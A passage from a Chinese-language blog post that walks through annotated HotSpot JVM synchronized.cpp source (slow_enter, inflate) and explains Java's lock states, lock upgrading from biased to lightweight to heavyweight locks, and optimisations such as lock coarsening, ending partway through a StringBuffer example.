class="line">  O<span class="function"><span class="title">bjectSynchronizer</span>::inflate(THREAD, object)-&gt;</span>exit (<span class="literal">true</span>, THREAD) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// Interpreter/Compiler Slow Case</span></span><br><span class="line"><span class="comment">// 解释器/编译器慢加锁的case。常规操作，此时不需使用fast_enter的方式，因为一定是在解释器/编译器已经失败过了。</span></span><br><span class="line"><span class="comment">// This routine is used to handle interpreter/compiler slow case</span></span><br><span class="line"><span class="comment">// We don't need to use fast path here, because it must have been</span></span><br><span class="line"><span class="comment">// failed in the interpreter/compiler code.</span></span><br><span class="line">void ObjectSynchronizer::slow_enter(Handle obj, BasicLock* lock, TRAPS) &#123;</span><br><span class="line">  <span class="function"><span class="title">markOop</span> mark = obj-&gt;</span>mark();</span><br><span class="line">  <span class="function"><span class="title">assert</span>(!mark-&gt;</span>has_bias_pattern(), <span class="string">"should not see bias pattern here"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">if</span> (mark-&gt;</span>is_neutral()) &#123;</span><br><span class="line">    <span class="comment">// 预期成功的CAS -- 替换标记的ST必须是可见的 &lt;= CAS执行的ST。优先使用轻量级锁（又叫：自旋锁）</span></span><br><span class="line">    <span class="comment">// Anticipate successful CAS -- the ST of the displaced mark must</span></span><br><span class="line">    <span class="comment">// be visible &lt;= the ST performed by the CAS.</span></span><br><span class="line">    <span class="function"><span class="title">lock</span>-&gt;</span>set_displaced_header(mark);</span><br><span class="line">    <span class="function"><span class="title">if</span> (mark == (markOop) Atomic::cmpxchg_ptr(lock, obj()-&gt;</span>mark_addr(), mark)) &#123;</span><br><span class="line">      TEVENT (slow_enter: release stacklock) ;</span><br><span class="line">      return ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Fall through to inflate() ... 上面没成功，只能向下执行inflate()锁膨胀方法了</span></span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">  <span class="function"><span class="title">if</span> (mark-&gt;</span><span class="function"><span class="title">has_locker</span>() &amp;&amp; THREAD-&gt;</span><span class="function"><span class="title">is_lock_owned</span>((address)mark-&gt;</span>locker())) &#123; <span class="comment">//当前线程已持有锁</span></span><br><span class="line">    <span class="function"><span class="title">assert</span>(lock != mark-&gt;</span>locker(), <span class="string">"must not re-lock the same lock"</span>);</span><br><span class="line">    <span class="function"><span class="title">assert</span>(lock != (BasicLock*)obj-&gt;</span>mark(), <span class="string">"don't relock with same BasicLock"</span>);</span><br><span class="line">    <span class="function"><span class="title">lock</span>-&gt;</span>set_displaced_header(NULL);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> <span class="number">0</span></span><br><span class="line">  <span class="comment">// The following optimization isn't particularly useful.</span></span><br><span class="line">  <span class="function"><span class="title">if</span> (mark-&gt;</span><span class="function"><span class="title">has_monitor</span>() &amp;&amp; mark-&gt;</span><span class="function"><span class="title">monitor</span>()-&gt;</span>is_entered(THREAD)) &#123;</span><br><span class="line">    <span class="function"><span class="title">lock</span>-&gt;</span>set_displaced_header (NULL) ;</span><br><span class="line">    return ;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对象头将再也不会被移到这个锁锁，所以是什么值并不重要，除非必须是非零的，以避免看起来像是重入锁，而且也不能看起来是锁定的。</span></span><br><span class="line">  <span class="comment">// 重量级锁的mrakword中除了锁标记位为10外，另外30位是：指向重量级锁的指针</span></span><br><span class="line">  <span class="comment">// The object header will never be displaced to this lock,</span></span><br><span class="line">  <span class="comment">// so it does not matter what the value is, except that it</span></span><br><span class="line">  <span class="comment">// must be non-zero to avoid looking like a re-entrant lock,</span></span><br><span class="line">  <span class="comment">// and must not look locked either.</span></span><br><span class="line">  <span class="function"><span class="title">lock</span>-&gt;</span>set_displaced_header(markOopDesc::unused_mark());</span><br><span class="line">  O<span class="function"><span class="title">bjectSynchronizer</span>::inflate(THREAD, obj())-&gt;</span>enter(THREAD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This routine is used to handle interpreter/compiler slow case</span></span><br><span class="line"><span class="comment">// We don't need to use fast path here, because it must have</span></span><br><span class="line"><span class="comment">// failed in the interpreter/compiler code. Simply use the heavy</span></span><br><span class="line"><span class="comment">// weight monitor should be ok, unless someone find otherwise.</span></span><br><span class="line">void ObjectSynchronizer::slow_exit(oop object, BasicLock* lock, TRAPS) &#123;</span><br><span class="line">  fast_exit (object, lock, THREAD) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="jdk源码中inflate-方法"><a href="#jdk源码中inflate-方法" class="headerlink" title="jdk源码中inflate 方法"></a>jdk源码中inflate 方法</h3><p>同样是synchronized.cpp文件中的方法, </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Note that we could encounter some performance loss through false-sharing as</span></span><br><span class="line"><span class="comment">// multiple locks occupy the same $ line.  Padding might be appropriate.</span></span><br><span class="line"><span class="comment">// 注意：当多个锁并发使用同一 $=行时，错误的共享方式可能会导致一些性能损失。填充可能是合适的。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">ObjectMonitor * ATTR <span class="title">ObjectSynchronizer::inflate</span> <span class="params">(Thread * Self, oop object)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Inflate mutates the heap ...</span></span><br><span class="line">  <span class="comment">// Relaxing assertion for bug 6320749.</span></span><br><span class="line">  assert (Universe::verify_in_progress() ||</span><br><span class="line">          !SafepointSynchronize::is_at_safepoint(), <span class="string">"invariant"</span>) ;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">      <span class="keyword">const</span> markOop mark = object-&gt;mark() ;</span><br><span class="line">      assert (!mark-&gt;has_bias_pattern(), <span class="string">"invariant"</span>) ;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// The mark can be in one of the following states:</span></span><br><span class="line">      <span class="comment">// *  Inflated     - just return 仅仅返回</span></span><br><span class="line">      <span class="comment">// *  Stack-locked - coerce it to inflated 轻量级锁，需强迫它膨胀</span></span><br><span class="line">      <span class="comment">// *  INFLATING    - busy wait for conversion to complete 膨胀中，需自旋等待转换完成</span></span><br><span class="line">      <span class="comment">// *  Neutral中立的 - aggressively inflate the object. 积极地使object发生膨胀</span></span><br><span class="line">      <span class="comment">// *  BIASED       - Illegal.  We should never see this 进入此方法必定不是偏向锁状态，直接忽略即可</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// CASE: inflated</span></span><br><span class="line">      <span class="keyword">if</span> (mark-&gt;has_monitor()) &#123;</span><br><span class="line">          ObjectMonitor * inf = mark-&gt;monitor() ;</span><br><span class="line">          assert (inf-&gt;header()-&gt;is_neutral(), <span class="string">"invariant"</span>);</span><br><span class="line">          assert (inf-&gt;object() == object, <span class="string">"invariant"</span>) ;</span><br><span class="line">          assert (ObjectSynchronizer::verify_objmon_isinpool(inf), <span class="string">"monitor is invalid"</span>);</span><br><span class="line">          <span class="keyword">return</span> inf ;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// CASE: inflation in progress - inflating over a stack-lock.   锁膨胀正在进行中，膨胀的堆栈锁（轻量级锁）</span></span><br><span class="line">      <span class="comment">// Some other thread is converting from stack-locked to inflated.     其他线程正在从堆栈锁（轻量级锁）定转换为膨胀。</span></span><br><span class="line">      <span class="comment">// Only that thread can complete inflation -- other threads must wait.  只有那个线程才能完成膨胀——其他线程必须等待。</span></span><br><span class="line">      <span class="comment">// The INFLATING value is transient.                    INFLATING状态是暂时的</span></span><br><span class="line">      <span class="comment">// Currently, we spin/yield/park and poll the markword, waiting for inflation to finish. 并发地，我们 spin/yield/park和poll的markword，等待inflation结束。</span></span><br><span class="line">      <span class="comment">// We could always eliminate polling by parking the thread on some auxiliary list.  我们总是可以通过将线程停在某个辅助列表上来消除轮询。</span></span><br><span class="line">      <span class="keyword">if</span> (mark == markOopDesc::INFLATING()) &#123;</span><br><span class="line">         TEVENT (Inflate: spin <span class="keyword">while</span> INFLATING) ;</span><br><span class="line">         ReadStableMark(object) ;</span><br><span class="line">         <span class="keyword">continue</span> ;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// CASE: stack-locked 此时锁为：轻量级锁，需强迫它膨胀为重量级锁</span></span><br><span class="line">      <span class="comment">// Could be stack-locked either by this thread or by some other thread.  可能被此线程或其他线程堆栈锁定</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// Note that we allocate the objectmonitor speculatively, _before_ attempting</span></span><br><span class="line">      <span class="comment">// to install INFLATING into the mark word.  We originally installed INFLATING,</span></span><br><span class="line">      <span class="comment">// allocated the objectmonitor, and then finally STed the address of the</span></span><br><span class="line">      <span class="comment">// objectmonitor into the mark.  This was correct, but artificially lengthened</span></span><br><span class="line">      <span class="comment">// the interval in which INFLATED appeared in the mark, thus increasing</span></span><br><span class="line">      <span class="comment">// the odds of inflation contention.</span></span><br><span class="line">      <span class="comment">// 我们大胆地分配objectmonitor，在此之前尝试将INFLATING状态先设置到mark word。</span></span><br><span class="line">      <span class="comment">// 我们先设置了INFLATING状态标记，然后分配了objectmonitor，最后将objectmonitor的地址设置到mark word中。</span></span><br><span class="line">      <span class="comment">// 这是正确的，但人为地延长了INFLATED出现在mark上的时间间隔，从而增加了锁膨胀的可能性。</span></span><br><span class="line">      <span class="comment">// 老外反复说了一堆重复的话，意思无非就是：markword设置状态INFLATING（结合上段对INFLATING处理的代码思考） -&gt; 分配锁 -&gt; markword设置状态INFLATED(膨胀重量级锁成功)</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// We now use per-thread private objectmonitor free lists.</span></span><br><span class="line">      <span class="comment">// These list are reprovisioned from the global free list outside the</span></span><br><span class="line">      <span class="comment">// critical INFLATING...ST interval.  A thread can transfer</span></span><br><span class="line">      <span class="comment">// multiple objectmonitors en-mass from the global free list to its local free list.</span></span><br><span class="line">      <span class="comment">// This reduces coherency traffic and lock contention on the global free list.</span></span><br><span class="line">      <span class="comment">// Using such local free lists, it doesn't matter if the omAlloc() call appears</span></span><br><span class="line">      <span class="comment">// before or after the CAS(INFLATING) operation.</span></span><br><span class="line">      <span class="comment">// See the comments in omAlloc().</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (mark-&gt;has_locker()) &#123;</span><br><span class="line">          ObjectMonitor * m = omAlloc (Self) ;</span><br><span class="line">          <span class="comment">// Optimistically prepare the objectmonitor - anticipate successful CAS</span></span><br><span class="line">          <span class="comment">// We do this before the CAS in order to minimize the length of time</span></span><br><span class="line">          <span class="comment">// in which INFLATING appears in the mark.</span></span><br><span class="line">          m-&gt;Recycle();</span><br><span class="line">          m-&gt;_Responsible  = <span class="literal">NULL</span> ;</span><br><span class="line">          m-&gt;OwnerIsThread = <span class="number">0</span> ;</span><br><span class="line">          m-&gt;_recursions   = <span class="number">0</span> ;</span><br><span class="line">          m-&gt;_SpinDuration = ObjectMonitor::Knob_SpinLimit ;   <span class="comment">// Consider: maintain by type/class</span></span><br><span class="line"></span><br><span class="line">          markOop cmp = (markOop) Atomic::cmpxchg_ptr (markOopDesc::INFLATING(), object-&gt;mark_addr(), mark) ;</span><br><span class="line">          <span class="keyword">if</span> (cmp != mark) &#123;</span><br><span class="line">             omRelease (Self, m, <span class="literal">true</span>) ;</span><br><span class="line">             <span class="keyword">continue</span> ;       <span class="comment">// Interference -- just retry</span></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// We've successfully installed INFLATING (0) into the mark-word.</span></span><br><span class="line">          <span class="comment">// This is the only case where 0 will appear in a mark-work.</span></span><br><span class="line">          <span class="comment">// Only the singular thread that successfully swings the mark-word</span></span><br><span class="line">          <span class="comment">// to 0 can perform (or more precisely, complete) inflation.</span></span><br><span class="line">          <span class="comment">//</span></span><br><span class="line">          <span class="comment">// Why do we CAS a 0 into the mark-word instead of just CASing the</span></span><br><span class="line">          <span class="comment">// mark-word from the stack-locked value directly to the new inflated state?</span></span><br><span class="line">          <span class="comment">// Consider what happens when a thread unlocks a stack-locked object.</span></span><br><span class="line">          <span class="comment">// It attempts to use CAS to swing the displaced header value from the</span></span><br><span class="line">          <span class="comment">// on-stack basiclock back into the object header.  Recall also that the</span></span><br><span class="line">          <span class="comment">// header value (hashcode, etc) can reside in (a) the object header, or</span></span><br><span class="line">          <span class="comment">// (b) a displaced header associated with the stack-lock, or (c) a displaced</span></span><br><span class="line">          <span class="comment">// header in an objectMonitor.  The inflate() routine must copy the header</span></span><br><span class="line">          <span class="comment">// value from the basiclock on the owner's stack to the objectMonitor, all</span></span><br><span class="line">          <span class="comment">// the while preserving the hashCode stability invariants.  If the owner</span></span><br><span class="line">          <span class="comment">// decides to release the lock while the value is 0, the unlock will fail</span></span><br><span class="line">          <span class="comment">// and control will eventually pass from slow_exit() to inflate.  The owner</span></span><br><span class="line">          <span class="comment">// will then spin, waiting for the 0 value to disappear.   Put another way,</span></span><br><span class="line">          <span class="comment">// the 0 causes the owner to stall if the owner happens to try to</span></span><br><span class="line">          <span class="comment">// drop the lock (restoring the header from the basiclock to the object)</span></span><br><span class="line">          <span class="comment">// while inflation is in-progress.  This protocol avoids races that might</span></span><br><span class="line">          <span class="comment">// would otherwise permit hashCode values to change or "flicker" for an object.</span></span><br><span class="line">          <span class="comment">// Critically, while object-&gt;mark is 0 mark-&gt;displaced_mark_helper() is stable.</span></span><br><span class="line">          <span class="comment">// 0 serves as a "BUSY" inflate-in-progress indicator.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          <span class="comment">// fetch the displaced mark from the owner's stack.</span></span><br><span class="line">          <span class="comment">// The owner can't die or unwind past the lock while our INFLATING</span></span><br><span class="line">          <span class="comment">// object is in the mark.  Furthermore the owner can't complete</span></span><br><span class="line">          <span class="comment">// an unlock on the object, either.</span></span><br><span class="line">          markOop dmw = mark-&gt;displaced_mark_helper() ;</span><br><span class="line">          assert (dmw-&gt;is_neutral(), <span class="string">"invariant"</span>) ;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// Setup monitor fields to proper values -- prepare the monitor</span></span><br><span class="line">          m-&gt;set_header(dmw) ;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// Optimization: if the mark-&gt;locker stack address is associated</span></span><br><span class="line">          <span class="comment">// with this thread we could simply set m-&gt;_owner = Self and</span></span><br><span class="line">          <span class="comment">// m-&gt;OwnerIsThread = 1. Note that a thread can inflate an object</span></span><br><span class="line">          <span class="comment">// that it has stack-locked -- as might happen in wait() -- directly</span></span><br><span class="line">          <span class="comment">// with CAS.  That is, we can avoid the xchg-NULL .... ST idiom.</span></span><br><span class="line">          m-&gt;set_owner(mark-&gt;locker());</span><br><span class="line">          m-&gt;set_object(object);</span><br><span class="line">          <span class="comment">// TODO-<span class="doctag">FIXME:</span> assert BasicLock-&gt;dhw != 0.</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">// Must preserve store ordering. The monitor state must</span></span><br><span class="line">          <span class="comment">// be stable at the time of publishing the monitor address.</span></span><br><span class="line">          guarantee (object-&gt;mark() == markOopDesc::INFLATING(), <span class="string">"invariant"</span>) ;</span><br><span class="line">          object-&gt;release_set_mark(markOopDesc::encode(m));</span><br><span class="line"></span><br><span class="line">          <span class="comment">// Hopefully the performance counters are allocated on distinct cache lines</span></span><br><span class="line">          <span class="comment">// to avoid false sharing on MP systems ...</span></span><br><span class="line">          <span class="keyword">if</span> (ObjectMonitor::_sync_Inflations != <span class="literal">NULL</span>) ObjectMonitor::_sync_Inflations-&gt;inc() ;</span><br><span class="line">          TEVENT(Inflate: overwrite stacklock) ;</span><br><span class="line">          <span class="keyword">if</span> (TraceMonitorInflation) &#123;</span><br><span class="line">            <span class="keyword">if</span> (object-&gt;is_instance()) &#123;</span><br><span class="line">              ResourceMark rm;</span><br><span class="line">              tty-&gt;print_cr(<span class="string">"Inflating object "</span> INTPTR_FORMAT <span class="string">" , mark "</span> INTPTR_FORMAT <span class="string">" , type %s"</span>,</span><br><span class="line">                (<span class="keyword">void</span> *) object, (<span class="keyword">intptr_t</span>) object-&gt;mark(),</span><br><span class="line">                object-&gt;klass()-&gt;external_name());</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> m ;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// CASE: neutral</span></span><br><span class="line">      <span class="comment">// TODO-<span class="doctag">FIXME:</span> for entry we currently inflate and then try to CAS _owner.</span></span><br><span class="line">      <span class="comment">// If we know we're inflating for entry it's better to inflate by swinging a</span></span><br><span class="line">      <span class="comment">// pre-locked objectMonitor pointer into the object header.   A successful</span></span><br><span class="line">      <span class="comment">// CAS inflates the object *and* confers ownership to the inflating thread.</span></span><br><span class="line">      <span class="comment">// In the current implementation we use a 2-step mechanism where we CAS()</span></span><br><span class="line">      <span class="comment">// to inflate and then CAS() again to try to swing _owner from NULL to Self.</span></span><br><span class="line">      <span class="comment">// An inflateTry() method that we could call from fast_enter() and slow_enter()</span></span><br><span class="line">      <span class="comment">// would be useful.</span></span><br><span class="line"></span><br><span class="line">      assert (mark-&gt;is_neutral(), <span class="string">"invariant"</span>);</span><br><span class="line">      ObjectMonitor * m = omAlloc (Self) ;</span><br><span class="line">      <span class="comment">// prepare m for installation - set monitor to initial state</span></span><br><span class="line">      m-&gt;Recycle();</span><br><span class="line">      m-&gt;set_header(mark);</span><br><span class="line">      m-&gt;set_owner(<span class="literal">NULL</span>);</span><br><span class="line">      m-&gt;set_object(object);</span><br><span class="line">      m-&gt;OwnerIsThread = <span class="number">1</span> ;</span><br><span class="line">      m-&gt;_recursions   = <span class="number">0</span> ;</span><br><span class="line">      m-&gt;_Responsible  = <span class="literal">NULL</span> ;</span><br><span class="line">      m-&gt;_SpinDuration = ObjectMonitor::Knob_SpinLimit ;       <span class="comment">// consider: keep metastats by type/class</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (Atomic::cmpxchg_ptr (markOopDesc::encode(m), object-&gt;mark_addr(), mark) != mark) &#123;</span><br><span class="line">          m-&gt;set_object (<span class="literal">NULL</span>) ;</span><br><span class="line">          m-&gt;set_owner  (<span class="literal">NULL</span>) ;</span><br><span class="line">          m-&gt;OwnerIsThread = <span class="number">0</span> ;</span><br><span class="line">          m-&gt;Recycle() ;</span><br><span class="line">          omRelease (Self, m, <span class="literal">true</span>) ;</span><br><span class="line">          m = <span class="literal">NULL</span> ;</span><br><span class="line">          <span class="keyword">continue</span> ;</span><br><span class="line">          <span class="comment">// interference - the markword changed - just retry.</span></span><br><span class="line">          <span class="comment">// The state-transitions are one-way, so there's no chance of</span></span><br><span class="line">          <span class="comment">// live-lock -- "Inflated" is an absorbing state.</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Hopefully the performance counters are allocated on distinct</span></span><br><span class="line">      <span class="comment">// cache lines to avoid false sharing on MP systems ...</span></span><br><span class="line">      <span class="keyword">if</span> (ObjectMonitor::_sync_Inflations != <span class="literal">NULL</span>) ObjectMonitor::_sync_Inflations-&gt;inc() ;</span><br><span class="line">      TEVENT(Inflate: overwrite neutral) ;</span><br><span class="line">      <span class="keyword">if</span> (TraceMonitorInflation) &#123;</span><br><span class="line">        <span class="keyword">if</span> (object-&gt;is_instance()) &#123;</span><br><span class="line">          ResourceMark rm;</span><br><span class="line">          tty-&gt;print_cr(<span class="string">"Inflating object "</span> INTPTR_FORMAT <span class="string">" , mark "</span> INTPTR_FORMAT <span class="string">" , type %s"</span>,</span><br><span class="line">            (<span class="keyword">void</span> *) object, (<span class="keyword">intptr_t</span>) object-&gt;mark(),</span><br><span class="line">            object-&gt;klass()-&gt;external_name());</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> m ;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="锁升级过程"><a href="#锁升级过程" class="headerlink" title="锁升级过程"></a>锁升级过程</h3><p>锁升级过程, 可以总结为: 无锁 -&gt; 偏向锁 -&gt; 轻量轻锁(自旋锁, 自适应自旋)</p><h3 id="锁的状态"><a href="#锁的状态" class="headerlink" title="锁的状态"></a>锁的状态</h3><p>锁的状态总共有四种: 无锁状态、偏向锁、轻量级锁和重量级锁。随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级的重量级锁（但是锁的升级是单向的，也就是说只能从低到高升级，不会出现锁的降级）。JDK 1.6中默认是开启偏向锁和轻量级锁的，我们也可以通过-XX:-UseBiasedLocking来禁用偏向锁。</p><h4 id="轻量级的加锁过程"><a href="#轻量级的加锁过程" class="headerlink" title="轻量级的加锁过程"></a>轻量级的加锁过程</h4><p>（1）在代码进入同步块的时候， 如果同步对象锁状态为无所状态（所标志位为“01”状态 ，是否为偏向锁为”0”) , 虚拟机首先将在当前线程的栈帧中建立一个名为锁记录（Lock Record）的空间，用于存储锁对象目前的Mark Word 的拷贝 ，官方称之为 Displaced Mark Word。 这时候线程堆栈与对象头的状态如图2.1所示 </p><p>（2）拷贝对象头中的Mark Word 复制到锁记录中 </p><p>  (3) 拷贝成功后，虚拟机将使用CAS操作尝试将对象的Mark Word 更新为指向Lock Record 的指针， 并将Lock record 里的owner 指针指向object mark word 。 如果更新成功， 则执行步骤（4），否则执行步骤（5)  </p><p>  (4) 如果这个更新操作成功了， 那么这个线程就拥有了该对象的锁， 并且对象Mark Word 的锁标志位设置位“00”，即表示此对象处于轻量级锁定状态， 这时候线程堆栈与对象头的状态如图2.2 所示 </p><p>（5）如果这个更新操作失败了 ，虚拟机首先会检查对象的Mark Word是否指向当前线程的栈帧，如果是就说明当前线程已经拥有了这个对象的锁，那就可以直接进入同步块继续执行。否则说明多个线程竞争锁，轻量级锁就要膨胀为重量级锁，所标志的状态值变为”10”, Mark Word 中存储的就是指向重量级锁（互斥量）的指针，后面等待锁的线程也要进入阻塞状态。而当前线程便尝试使用自旋来获取锁，自旋就是为了不让线程阻塞，而采用循环去获取锁的过程</p><p><img src="../images/Synchronized/image-20210608155231757.png" alt="image-20210608155231757"></p><p><img src="../images/Synchronized/image-20210608161055240.png" alt="image-20210608161055240"></p><h3 id="偏向锁"><a href="#偏向锁" class="headerlink" title="偏向锁"></a>偏向锁</h3><p>引入偏向锁是为了在无线程竞争的情况下尽量减少不必要的轻量级锁执行路径， 因为轻量级锁的获取及释放依赖多次CAS原子指令， 而偏向锁只要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销操作的性能损耗必须小于节省下来的CAS原子指令的性能消耗）。上面说过，轻量级锁是为了在线程交替执行同步块时提高性能，而偏向锁则是在只有一个线程执行同步块时进一步提高性能。</p><p>1、偏向锁获取过程：</p><p>　　（1）访问Mark Word中偏向锁的标识是否设置成1，锁标志位是否为01——确认为可偏向状态。</p><p>　　（2）如果为可偏向状态，则测试线程ID是否指向当前线程，如果是，进入步骤（5），否则进入步骤（3）。</p><p>　　（3）如果线程ID并未指向当前线程，则通过CAS操作竞争锁。如果竞争成功，则将Mark Word中线程ID设置为当前线程ID，然后执行（5）；如果竞争失败，执行（4）。</p><p>　　（4）如果CAS获取偏向锁失败，则表示有竞争。当到达全局安全点（safepoint）时获得偏向锁的线程被挂起，偏向锁升级为轻量级锁，然后被阻塞在安全点的线程继续往下执行同步代码。</p><p>　　（5）执行同步代码。</p><p>2、偏向锁的释放：</p><p>　　偏向锁的撤销在上述第四步骤中有提到。偏向锁只有遇到其他线程尝试竞争偏向锁时，持有偏向锁的线程才会释放锁，线程不会主动去释放偏向锁。偏向锁的撤销，需要等待全局安全点（在这个时间点上没有字节码正在执行），它会首先暂停拥有偏向锁的线程，判断锁对象是否处于被锁定状态，撤销偏向锁后恢复到未锁定（标志位为“01”）或轻量级锁（标志位为“00”）的状态。</p><p>3、重量级锁、轻量级锁和偏向锁之间转换</p><p><strong><img src="../images/Synchronized/af728337fcdbb13cb541787eac5a27371603856918316.png" alt="Java 锁与对象头5"></strong></p><h3 id="其它优化"><a href="#其它优化" class="headerlink" title="其它优化"></a>其它优化</h3><ol><li>适应性自旋</li><li>锁粗化(Lock Coarsening): 就是将多次连接在一起的加锁、解锁操作合并为一次，将多个连锁的锁扩展成一个范围更大的锁</li></ol><p>例</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> StringBufferTest&#123;</span><br><span class="line">StringBuffer stringBuffer =  <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="keyword">append</span>()&#123;</span><br><span class="line">stringBuffer.<span class="keyword">append</span>(<span class="string">"a"</span>);</span><br><span class="line">stringBuffer.<span class="keyword">append</span>(<span class="string">"b"</span>);</span><br><span 